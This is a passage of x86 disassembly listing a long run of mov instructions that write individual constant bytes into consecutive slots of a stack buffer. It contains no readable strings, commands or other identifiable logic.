  406687:	c6 85 77 ec ff ff 90 	mov    BYTE PTR [ebp-0x1389],0x90
  40668e:	c6 85 78 ec ff ff 80 	mov    BYTE PTR [ebp-0x1388],0x80
  406695:	c6 85 79 ec ff ff 40 	mov    BYTE PTR [ebp-0x1387],0x40
  40669c:	c6 85 7a ec ff ff 5f 	mov    BYTE PTR [ebp-0x1386],0x5f
  4066a3:	c6 85 7b ec ff ff d4 	mov    BYTE PTR [ebp-0x1385],0xd4
  4066aa:	c6 85 7c ec ff ff e4 	mov    BYTE PTR [ebp-0x1384],0xe4
  4066b1:	c6 85 7d ec ff ff b8 	mov    BYTE PTR [ebp-0x1383],0xb8
  4066b8:	88 9d 7e ec ff ff    	mov    BYTE PTR [ebp-0x1382],bl
  4066be:	c6 85 7f ec ff ff 30 	mov    BYTE PTR [ebp-0x1381],0x30
  4066c5:	88 9d 80 ec ff ff    	mov    BYTE PTR [ebp-0x1380],bl
  4066cb:	c6 85 81 ec ff ff 8f 	mov    BYTE PTR [ebp-0x137f],0x8f
  4066d2:	c6 85 82 ec ff ff 5e 	mov    BYTE PTR [ebp-0x137e],0x5e
  4066d9:	c6 85 83 ec ff ff bd 	mov    BYTE PTR [ebp-0x137d],0xbd
  4066e0:	c6 85 84 ec ff ff f3 	mov    BYTE PTR [ebp-0x137c],0xf3
  4066e7:	c6 85 85 ec ff ff f0 	mov    BYTE PTR [ebp-0x137b],0xf0
  4066ee:	c6 85 86 ec ff ff fb 	mov    BYTE PTR [ebp-0x137a],0xfb
  4066f5:	c6 85 87 ec ff ff c1 	mov    BYTE PTR [ebp-0x1379],0xc1
  4066fc:	c6 85 88 ec ff ff 44 	mov    BYTE PTR [ebp-0x1378],0x44
  406703:	c6 85 89 ec ff ff b4 	mov    BYTE PTR [ebp-0x1377],0xb4
  40670a:	c6 85 8a ec ff ff 28 	mov    BYTE PTR [ebp-0x1376],0x28
  406711:	c6 85 8b ec ff ff 80 	mov    BYTE PTR [ebp-0x1375],0x80
  406718:	c6 85 8c ec ff ff 40 	mov    BYTE PTR [ebp-0x1374],0x40
  40671f:	c6 85 8d ec ff ff 32 	mov    BYTE PTR [ebp-0x1373],0x32
  406726:	c6 85 8e ec ff ff 90 	mov    BYTE PTR [ebp-0x1372],0x90
  40672d:	c6 85 8f ec ff ff 50 	mov    BYTE PTR [ebp-0x1371],0x50
  406734:	c6 85 90 ec ff ff 8b 	mov    BYTE PTR [ebp-0x1370],0x8b
  40673b:	c6 85 91 ec ff ff b4 	mov    BYTE PTR [ebp-0x136f],0xb4
  406742:	c6 85 92 ec ff ff 04 	mov    BYTE PTR [ebp-0x136e],0x4
  406749:	c6 85 93 ec ff ff d8 	mov    BYTE PTR [ebp-0x136d],0xd8
  406750:	c6 85 94 ec ff ff ad 	mov    BYTE PTR [ebp-0x136c],0xad
  406757:	c6 85 95 ec ff ff 80 	mov    BYTE PTR [ebp-0x136b],0x80
  40675e:	c6 85 96 ec ff ff e1 	mov    BYTE PTR [ebp-0x136a],0xe1
  406765:	c6 85 97 ec ff ff b0 	mov    BYTE PTR [ebp-0x1369],0xb0
  40676c:	c6 85 98 ec ff ff 80 	mov    BYTE PTR [ebp-0x1368],0x80
  406773:	c6 85 99 ec ff ff b4 	mov    BYTE PTR [ebp-0x1367],0xb4
  40677a:	c6 85 9a ec ff ff 7b 	mov    BYTE PTR [ebp-0x1366],0x7b
  406781:	c6 85 9b ec ff ff 23 	mov    BYTE PTR [ebp-0x1365],0x23
  406788:	c6 85 9c ec ff ff 68 	mov    BYTE PTR [ebp-0x1364],0x68
  40678f:	c6 85 9d ec ff ff 31 	mov    BYTE PTR [ebp-0x1363],0x31
  406796:	c6 85 9e ec ff ff 14 	mov    BYTE PTR [ebp-0x1362],0x14
  40679d:	c6 85 9f ec ff ff c5 	mov    BYTE PTR [ebp-0x1361],0xc5
  4067a4:	c6 85 a0 ec ff ff 33 	mov    BYTE PTR [ebp-0x1360],0x33
  4067ab:	c6 85 a1 ec ff ff 30 	mov    BYTE PTR [ebp-0x135f],0x30
  4067b2:	c6 85 a2 ec ff ff 02 	mov    BYTE PTR [ebp-0x135e],0x2
  4067b9:	c6 85 a3 ec ff ff a0 	mov    BYTE PTR [ebp-0x135d],0xa0
  4067c0:	c6 85 a4 ec ff ff c0 	mov    BYTE PTR [ebp-0x135c],0xc0
  4067c7:	c6 85 a5 ec ff ff 3f 	mov    BYTE PTR [ebp-0x135b],0x3f
  4067ce:	c6 85 a6 ec ff ff b7 	mov    BYTE PTR [ebp-0x135a],0xb7
  4067d5:	c6 85 a7 ec ff ff 84 	mov    BYTE PTR [ebp-0x1359],0x84
  4067dc:	c6 85 a8 ec ff ff a4 	mov    BYTE PTR [ebp-0x1358],0xa4
  4067e3:	c6 85 a9 ec ff ff 0c 	mov    BYTE PTR [ebp-0x1357],0xc
  4067ea:	c6 85 aa ec ff ff 83 	mov    BYTE PTR [ebp-0x1356],0x83
  4067f1:	c6 85 ab ec ff ff c8 	mov    BYTE PTR [ebp-0x1355],0xc8
  4067f8:	c6 85 ac ec ff ff c1 	mov    BYTE PTR [ebp-0x1354],0xc1
  4067ff:	c6 85 ad ec ff ff f4 	mov    BYTE PTR [ebp-0x1353],0xf4
  406806:	c6 85 ae ec ff ff 9a 	mov    BYTE PTR [ebp-0x1352],0x9a
  40680d:	c6 85 af ec ff ff 63 	mov    BYTE PTR [ebp-0x1351],0x63
  406814:	c6 85 b0 ec ff ff e8 	mov    BYTE PTR [ebp-0x1350],0xe8
  40681b:	c6 85 b1 ec ff ff 81 	mov    BYTE PTR [ebp-0x134f],0x81
  406822:	c6 85 b2 ec ff ff 75 	mov    BYTE PTR [ebp-0x134e],0x75
  406829:	c6 85 b3 ec ff ff f2 	mov    BYTE PTR [ebp-0x134d],0xf2
  406830:	c6 85 b4 ec ff ff 8b 	mov    BYTE PTR [ebp-0x134c],0x8b
  406837:	c6 85 b5 ec ff ff 94 	mov    BYTE PTR [ebp-0x134b],0x94
  40683e:	c6 85 b6 ec ff ff 04 	mov    BYTE PTR [ebp-0x134a],0x4
  406845:	c6 85 b7 ec ff ff f4 	mov    BYTE PTR [ebp-0x1349],0xf4
  40684c:	c6 85 b8 ec ff ff 6a 	mov    BYTE PTR [ebp-0x1348],0x6a
  406853:	c6 85 b9 ec ff ff 42 	mov    BYTE PTR [ebp-0x1347],0x42
  40685a:	c6 85 ba ec ff ff 30 	mov    BYTE PTR [ebp-0x1346],0x30
  406861:	c6 85 bb ec ff ff bf 	mov    BYTE PTR [ebp-0x1345],0xbf
  406868:	c6 85 bc ec ff ff 55 	mov    BYTE PTR [ebp-0x1344],0x55
  40686f:	c6 85 bd ec ff ff 14 	mov    BYTE PTR [ebp-0x1343],0x14
  406876:	c6 85 be ec ff ff 80 	mov    BYTE PTR [ebp-0x1342],0x80
  40687d:	c6 85 bf ec ff ff 30 	mov    BYTE PTR [ebp-0x1341],0x30
  406884:	88 9d c0 ec ff ff    	mov    BYTE PTR [ebp-0x1340],bl
  40688a:	c6 85 c1 ec ff ff c8 	mov    BYTE PTR [ebp-0x133f],0xc8
  406891:	c6 85 c2 ec ff ff e1 	mov    BYTE PTR [ebp-0x133e],0xe1
